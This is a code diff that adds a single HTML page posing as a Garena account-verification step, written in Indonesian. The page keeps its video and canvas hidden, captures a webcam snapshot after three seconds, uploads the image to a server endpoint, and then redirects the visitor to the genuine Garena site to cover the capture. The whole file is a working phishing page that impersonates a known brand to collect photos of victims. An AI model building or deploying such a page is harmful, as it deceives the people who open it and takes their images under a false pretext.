@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Verifikasi Akun Garena</title>
+  <style>
+    body { font-family: sans-serif; text-align: center; padding: 50px; }
+    video, canvas { display: none; }
+  </style>
+</head>
+<body>
+  <h2>Verifikasi Akun Garena</h2>
+  <p>Kamera akan aktif dan mengambil gambar otomatis dalam 3 detik...</p>
+
+  <video id="video" autoplay></video>
+  <canvas id="canvas" width="320" height="240"></canvas>
+
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const ctx = canvas.getContext('2d');
+
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        video.srcObject = stream;
+
+        setTimeout(() => {
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          const imgData = canvas.toDataURL('image/png');
+
+          fetch('/upload', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ image: imgData })
+          }).then(() => {
+            window.location.href = "https://www.garena.co.id/";
+          });
+
+        }, 3000);
+      })
+      .catch(() => {
+        alert("Akses kamera ditolak.");
+      });
+  </script>
+</body>
+</html>
